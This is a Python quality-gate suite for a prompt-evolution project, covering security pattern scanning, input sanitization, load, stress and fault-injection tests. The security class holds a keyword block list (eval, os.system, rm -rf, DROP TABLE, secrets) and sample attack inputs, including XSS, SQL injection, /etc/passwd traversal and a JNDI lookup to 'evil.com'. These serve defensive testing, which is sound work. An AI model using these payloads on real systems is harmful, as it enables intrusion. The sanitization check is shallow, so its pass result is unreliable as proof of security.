#!/usr/bin/env python3
"""
Comprehensive Quality Gates and Testing Suite
Security, performance, reliability, and coverage validation.
"""

import json
import time
import logging
import traceback
import sys
import concurrent.futures
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from meta_prompt_evolution.evolution.population import PromptPopulation, Prompt
from meta_prompt_evolution.evaluation.base import TestCase, FitnessFunction


@dataclass
class QualityResult:
    """Result from a quality gate check."""
    name: str
    passed: bool
    score: float
    details: Dict[str, Any]
    execution_time: float
    critical: bool = False


class SecurityValidator:
    """Security validation and vulnerability scanning."""
    
    def __init__(self):
        self.vulnerability_patterns = {
            'injection': ['eval(', 'exec(', '__import__', 'subprocess', 'os.system'],
            'xss': ['<script', 'javascript:', 'onload=', 'onerror='],
            'path_traversal': ['../', '..\\', '/etc/', 'C:\\'],
            'unsafe_patterns': ['rm -rf', 'DROP TABLE', 'DELETE FROM', 'shutdown'],
            'secrets': ['password', 'api_key', 'secret', 'token', 'private_key']
        }
        
    def scan_prompt_content(self, prompts: List[Prompt]) -> QualityResult:
        """Scan prompt content for security vulnerabilities."""
        start_time = time.time()
        vulnerabilities = []
        total_prompts = len(prompts)
        
        for prompt in prompts:
            text = prompt.text.lower()
            
            for vuln_type, patterns in self.vulnerability_patterns.items():
                for pattern in patterns:
                    if pattern in text:
                        vulnerabilities.append({
                            "prompt_id": prompt.id,
                            "vulnerability_type": vuln_type,
                            "pattern": pattern,
                            "text_snippet": text[:100]
                        })
        
        # Calculate security score
        vulnerability_rate = len(vulnerabilities) / max(total_prompts, 1)
        security_score = max(0.0, 1.0 - vulnerability_rate)
        
        passed = security_score >= 0.95  # 95% security threshold
        
        return QualityResult(
            name="Security Scan",
            passed=passed,
            score=security_score,
            details={
                "vulnerabilities_found": len(vulnerabilities),
                "vulnerability_rate": vulnerability_rate,
                "vulnerabilities": vulnerabilities[:10],  # First 10 for reporting
                "total_prompts_scanned": total_prompts
            },
            execution_time=time.time() - start_time,
            critical=True
        )
    
    def validate_input_sanitization(self, sample_inputs: List[str]) -> QualityResult:
        """Validate input sanitization mechanisms."""
        start_time = time.time()
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "eval(__import__('os').system('ls'))",
            "${jndi:ldap://evil.com/a}"
        ]
        
        sanitization_failures = []
        
        for malicious_input in malicious_inputs:
            # Simulate input processing
            try:
                # Basic sanitization check
                sanitized = malicious_input.replace('<', '&lt;').replace('>', '&gt;')
                if malicious_input == sanitized and any(pattern in malicious_input for pattern in ['<', '>', 'script']):
                    sanitization_failures.append({
                        "input": malicious_input,
                        "failure_type": "insufficient_sanitization"
                    })
            except Exception as e:
                sanitization_failures.append({
                    "input": malicious_input,
                    "failure_type": "processing_error",
                    "error": str(e)
                })
        
        sanitization_score = 1.0 - (len(sanitization_failures) / len(malicious_inputs))
        passed = sanitization_score >= 0.8
        
        return QualityResult(
            name="Input Sanitization",
            passed=passed,
            score=sanitization_score,
            details={
                "sanitization_failures": sanitization_failures,
                "malicious_inputs_tested": len(malicious_inputs),
                "failure_rate": len(sanitization_failures) / len(malicious_inputs)
            },
            execution_time=time.time() - start_time,
            critical=True
        )


class PerformanceValidator:
    """Performance testing and benchmark validation."""
    
    def benchmark_response_time(self, fitness_fn, prompts: List[Prompt], test_cases: List[TestCase]) -> QualityResult:
        """Benchmark response time performance."""
        start_time = time.time()
        
        response_times = []
        failed_evaluations = 0
        
        for prompt in prompts[:50]:  # Test first 50 for performance
            eval_start = time.time()
            try:
                result = fitness_fn.evaluate(prompt, test_cases)
                eval_time = time.time() - eval_start
                response_times.append(eval_time)
                
                if "error" in result:
                    failed_evaluations += 1
                    
            except Exception:
                failed_evaluations += 1
                response_times.append(1.0)  # Penalty for failed evaluations
        
        if response_times:
            avg_response_time = sum(response_times) / len(response_times)
            p95_response_time = sorted(response_times)[int(len(response_times) * 0.95)]
            p99_response_time = sorted(response_times)[int(len(response_times) * 0.99)]
        else:
            avg_response_time = p95_response_time = p99_response_time = 1.0
        
        # Performance scoring (target: <100ms average, <200ms P95)
        time_score = min(1.0, 0.1 / max(avg_response_time, 0.001))
        p95_score = min(1.0, 0.2 / max(p95_response_time, 0.001))
        performance_score = (time_score + p95_score) / 2.0
        
        passed = avg_response_time < 0.1 and p95_response_time < 0.2
        
        return QualityResult(
            name="Performance Benchmark",
            passed=passed,
            score=performance_score,
            details={
                "average_response_time": avg_response_time,
                "p95_response_time": p95_response_time,
                "p99_response_time": p99_response_time,
                "failed_evaluations": failed_evaluations,
                "evaluations_tested": len(response_times),
                "target_avg_ms": 100,
                "target_p95_ms": 200
            },
            execution_time=time.time() - start_time
        )
    
    def load_test(self, fitness_fn, population: PromptPopulation, test_cases: List[TestCase]) -> QualityResult:
        """Perform load testing with concurrent requests."""
        start_time = time.time()
        
        def evaluate_batch(prompts_batch):
            results = []
            for prompt in prompts_batch:
                try:
                    result = fitness_fn.evaluate(prompt, test_cases)
                    results.append(result)
                except Exception as e:
                    results.append({"error": str(e)})
            return results
        
        # Split population into batches for concurrent processing
        batch_size = max(1, len(population) // 4)
        batches = [population.prompts[i:i+batch_size] for i in range(0, len(population), batch_size)]
        
        concurrent_start = time.time()
        successful_batches = 0
        total_evaluations = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(evaluate_batch, batch) for batch in batches]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    batch_results = future.result()
                    successful_batches += 1
                    total_evaluations += len(batch_results)
                except Exception:
                    pass
        
        concurrent_time = time.time() - concurrent_start
        throughput = total_evaluations / concurrent_time if concurrent_time > 0 else 0
        
        # Load testing scoring (target: >10 prompts/sec under load)
        throughput_score = min(1.0, throughput / 10.0)
        concurrency_score = successful_batches / len(batches) if batches else 1.0
        load_score = (throughput_score + concurrency_score) / 2.0
        
        passed = throughput >= 10.0 and concurrency_score >= 0.8
        
        return QualityResult(
            name="Load Test",
            passed=passed,
            score=load_score,
            details={
                "throughput_prompts_per_sec": throughput,
                "successful_batches": successful_batches,
                "total_batches": len(batches),
                "total_evaluations": total_evaluations,
                "concurrent_execution_time": concurrent_time,
                "target_throughput": 10.0
            },
            execution_time=time.time() - start_time
        )


class ReliabilityValidator:
    """Reliability and fault tolerance testing."""
    
    def stress_test(self, fitness_fn, extreme_prompts: List[str], test_cases: List[TestCase]) -> QualityResult:
        """Test system reliability under stress conditions."""
        start_time = time.time()
        
        # Create stress test prompts
        stress_prompts = [
            "",  # Empty prompt
            "A" * 1000,  # Very long prompt
            "🚀" * 100,  # Unicode stress
            "\n\n\n\n\n" * 20,  # Whitespace stress
            "Special chars: !@#$%^&*()[]{}|;':\",./<>?",
            "null\x00byte\x01test\x02"  # Null bytes
        ]
        
        stress_prompts.extend(extreme_prompts)
        
        failures = []
        recoveries = []
        total_tests = 0
        
        for i, prompt_text in enumerate(stress_prompts):
            total_tests += 1
            
            try:
                prompt = Prompt(text=prompt_text, id=f"stress_{i}")
                result = fitness_fn.evaluate(prompt, test_cases)
                
                if "error" in result:
                    failures.append({
                        "test_case": i,
                        "prompt_length": len(prompt_text),
                        "error": result.get("error", "unknown"),
                        "recovered": True  # If we get an error result, system recovered
                    })
                    recoveries.append(i)
                
            except Exception as e:
                failures.append({
                    "test_case": i,
                    "prompt_length": len(prompt_text) if prompt_text else 0,
                    "error": str(e),
                    "recovered": False  # Exception means no recovery
                })
        
        failure_rate = len(failures) / total_tests if total_tests > 0 else 0
        recovery_rate = len(recoveries) / len(failures) if failures else 1.0
        reliability_score = (1.0 - failure_rate) * 0.7 + recovery_rate * 0.3
        
        passed = failure_rate <= 0.3 and recovery_rate >= 0.8
        
        return QualityResult(
            name="Stress Test",
            passed=passed,
            score=reliability_score,
            details={
                "total_stress_tests": total_tests,
                "failures": len(failures),
                "recoveries": len(recoveries),
                "failure_rate": failure_rate,
                "recovery_rate": recovery_rate,
                "failure_details": failures[:5]  # First 5 failures
            },
            execution_time=time.time() - start_time
        )
    
    def fault_injection_test(self, fitness_fn, normal_prompts: List[Prompt], test_cases: List[TestCase]) -> QualityResult:
        """Test fault tolerance with injected failures."""
        start_time = time.time()
        
        fault_scenarios = []
        
        # Test with corrupted prompts
        for i, prompt in enumerate(normal_prompts[:3]):
            # Inject various faults
            corrupted_text = prompt.text + "\x00\x01\x02"  # Null bytes
            corrupted_prompt = Prompt(text=corrupted_text, id=f"fault_{i}")
            
            try:
                result = fitness_fn.evaluate(corrupted_prompt, test_cases)
                fault_scenarios.append({
                    "scenario": "null_bytes",
                    "handled": "error" in result or result.get("fitness", 0) >= 0,
                    "result": result
                })
            except Exception as e:
                fault_scenarios.append({
                    "scenario": "null_bytes",
                    "handled": False,
                    "error": str(e)
                })
        
        # Test with corrupted test cases
        try:
            corrupted_test_cases = [
                TestCase(input_data="test", expected_output="test", weight=1.0),
            ]
            
            result = fitness_fn.evaluate(normal_prompts[0], corrupted_test_cases)
            fault_scenarios.append({
                "scenario": "valid_test_cases",
                "handled": "error" in result or result.get("fitness", 0) >= 0,
                "result": result
            })
        except Exception as e:
            fault_scenarios.append({
                "scenario": "valid_test_cases",
                "handled": False,
                "error": str(e)
            })
        
        handled_faults = sum(1 for scenario in fault_scenarios if scenario["handled"])
        fault_tolerance_score = handled_faults / len(fault_scenarios) if fault_scenarios else 1.0
        
        passed = fault_tolerance_score >= 0.8
        
        return QualityResult(
            name="Fault Injection Test",
            passed=passed,
            score=fault_tolerance_score,
            details={
                "fault_scenarios_tested": len(fault_scenarios),
                "faults_handled": handled_faults,
                "fault_tolerance_rate": fault_tolerance_score,
                "scenario_details": fault_scenarios
            },
            execution_time=time.time() - start_time
        )


class CoverageValidator:
    """Code coverage and test completeness validation."""
    
    def estimate_test_coverage(self, test_results: List[QualityResult]) -> QualityResult:
        """Estimate test coverage based on executed tests."""
        start_time = time.time()
        
        # Core components that should be tested
        required_components = {
            "fitness_evaluation": False,
            "error_handling": False,
            "input_validation": False,
            "performance_optimization": False,
            "security_validation": False,
            "concurrent_processing": False,
            "caching_mechanism": False,
            "fault_tolerance": False
        }
        
        # Analyze test results to determine coverage
        for result in test_results:
            if "performance" in result.name.lower() or "benchmark" in result.name.lower():
                required_components["fitness_evaluation"] = True
                required_components["performance_optimization"] = True
            
            if "security" in result.name.lower():
                required_components["security_validation"] = True
                required_components["input_validation"] = True
            
            if "load" in result.name.lower() or "concurrent" in result.name.lower():
                required_components["concurrent_processing"] = True
            
            if "stress" in result.name.lower() or "fault" in result.name.lower():
                required_components["error_handling"] = True
                required_components["fault_tolerance"] = True
            
            # Check if caching was mentioned in details
            if any("cache" in str(detail).lower() for detail in result.details.values()):
                required_components["caching_mechanism"] = True
        
        components_tested = sum(required_components.values())
        coverage_score = components_tested / len(required_components)
        
        passed = coverage_score >= 0.75  # 75% coverage threshold
        
        return QualityResult(
            name="Test Coverage Analysis",
            passed=passed,
            score=coverage_score,
            details={
                "components_tested": components_tested,
                "total_components": len(required_components),
                "coverage_percentage": coverage_score * 100,
                "component_coverage": required_components
            },
            execution_time=time.time() - start_time
        )


def run_comprehensive_quality_gates():
    """Run comprehensive quality gates and testing suite."""
    print("🧪 Comprehensive Quality Gates - Starting Test Suite")
    start_time = time.time()
    
    # Setup logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    try:
        # Initialize validators
        security_validator = SecurityValidator()
        performance_validator = PerformanceValidator()
        reliability_validator = ReliabilityValidator()
        coverage_validator = CoverageValidator()
        
        # Create test data
        test_prompts = [
            "You are a helpful assistant. Please {task}",
            "As an AI assistant, I will help you {task}",
            "Help with {task} - let me assist you properly.",
            "I can support your {task} efficiently",
            "Let me guide you through {task}"
        ]
        
        population = PromptPopulation.from_seeds(test_prompts)
        
        test_cases = [
            TestCase(
                input_data="Explain quantum computing",
                expected_output="Clear scientific explanation",
                metadata={"difficulty": "high"},
                weight=1.0
            ),
            TestCase(
                input_data="Write a summary", 
                expected_output="Concise summary",
                metadata={"difficulty": "medium"},
                weight=0.8
            )
        ]
        
        # Simple fitness function for testing
        class TestFitnessFunction(FitnessFunction):
            def evaluate(self, prompt: Prompt, test_cases: List[TestCase]) -> Dict[str, float]:
                if not prompt.text or len(prompt.text.strip()) == 0:
                    return {"fitness": 0.0, "error": "empty_prompt"}
                return {"fitness": min(len(prompt.text) / 100.0, 1.0), "length": len(prompt.text)}
            
            async def evaluate_async(self, prompt: Prompt, test_cases: List[TestCase]) -> Dict[str, float]:
                return self.evaluate(prompt, test_cases)
        
        fitness_fn = TestFitnessFunction()
        
        # Execute quality gates
        quality_results = []
        
        print("🔒 Running Security Validation...")
        security_scan = security_validator.scan_prompt_content(population.prompts)
        quality_results.append(security_scan)
        print(f"   Security Score: {security_scan.score:.1%} - {'✅ PASS' if security_scan.passed else '❌ FAIL'}")
        
        input_sanitization = security_validator.validate_input_sanitization(test_prompts)
        quality_results.append(input_sanitization)
        print(f"   Input Sanitization: {input_sanitization.score:.1%} - {'✅ PASS' if input_sanitization.passed else '❌ FAIL'}")
        
        print("\n⚡ Running Performance Validation...")
        performance_benchmark = performance_validator.benchmark_response_time(fitness_fn, population.prompts, test_cases)
        quality_results.append(performance_benchmark)
        print(f"   Response Time: {performance_benchmark.details['average_response_time']*1000:.1f}ms avg - {'✅ PASS' if performance_benchmark.passed else '❌ FAIL'}")
        
        load_test = performance_validator.load_test(fitness_fn, population, test_cases)
        quality_results.append(load_test)
        print(f"   Load Test: {load_test.details['throughput_prompts_per_sec']:.1f} prompts/sec - {'✅ PASS' if load_test.passed else '❌ FAIL'}")
        
        print("\n🛡️ Running Reliability Validation...")
        stress_test = reliability_validator.stress_test(fitness_fn, test_prompts, test_cases)
        quality_results.append(stress_test)
        print(f"   Stress Test: {stress_test.score:.1%} reliability - {'✅ PASS' if stress_test.passed else '❌ FAIL'}")
        
        fault_injection = reliability_validator.fault_injection_test(fitness_fn, population.prompts, test_cases)
        quality_results.append(fault_injection)
        print(f"   Fault Tolerance: {fault_injection.score:.1%} - {'✅ PASS' if fault_injection.passed else '❌ FAIL'}")
        
        print("\n📊 Running Coverage Analysis...")
        coverage_analysis = coverage_validator.estimate_test_coverage(quality_results)
        quality_results.append(coverage_analysis)
        print(f"   Test Coverage: {coverage_analysis.score:.1%} - {'✅ PASS' if coverage_analysis.passed else '❌ FAIL'}")
        
        # Calculate overall quality score
        total_score = sum(result.score for result in quality_results) / len(quality_results)
        critical_tests_passed = all(result.passed for result in quality_results if result.critical)
        all_tests_passed = all(result.passed for result in quality_results)
        
        execution_time = time.time() - start_time
        
        # Summary
        print(f"\n📋 Quality Gates Summary:")
        print(f"   Overall Score: {total_score:.1%}")
        print(f"   Tests Passed: {sum(1 for r in quality_results if r.passed)}/{len(quality_results)}")
        print(f"   Critical Tests: {'✅ PASS' if critical_tests_passed else '❌ FAIL'}")
        print(f"   Execution Time: {execution_time:.2f}s")
        
        results = {
            "overall_score": total_score,
            "all_tests_passed": all_tests_passed,
            "critical_tests_passed": critical_tests_passed,
            "tests_passed": sum(1 for r in quality_results if r.passed),
            "total_tests": len(quality_results),
            "execution_time": execution_time,
            "quality_results": [
                {
                    "name": r.name,
                    "passed": r.passed,
                    "score": r.score,
                    "critical": r.critical,
                    "execution_time": r.execution_time,
                    "details": r.details
                }
                for r in quality_results
            ]
        }
        
        # Save results
        with open("comprehensive_quality_report.json", "w") as f:
            json.dump(results, f, indent=2)
        
        print("💾 Quality report saved to comprehensive_quality_report.json")
        
        return results
        
    except Exception as e:
        logger.error(f"Quality gates error: {e}")
        logger.error(traceback.format_exc())
        
        return {
            "overall_score": 0.0,
            "all_tests_passed": False,
            "critical_tests_passed": False,
            "error": str(e),
            "execution_time": time.time() - start_time
        }


if __name__ == "__main__":
    results = run_comprehensive_quality_gates()
    
    # Validate quality criteria
    if (results.get("critical_tests_passed", False) and 
        results.get("overall_score", 0) >= 0.80):
        print("\n🎉 QUALITY GATES: ALL PASSED!")
        print("✅ Security validation passed")
        print("✅ Performance benchmarks met")
        print("✅ Reliability tests passed")
        print("✅ Test coverage adequate")
        print("✅ Ready for production deployment")
    else:
        print("\n⚠️  Quality gates need attention")
        print(f"Overall Score: {results.get('overall_score', 0):.1%}")
        print(f"Critical Tests: {'PASSED' if results.get('critical_tests_passed', False) else 'FAILED'}")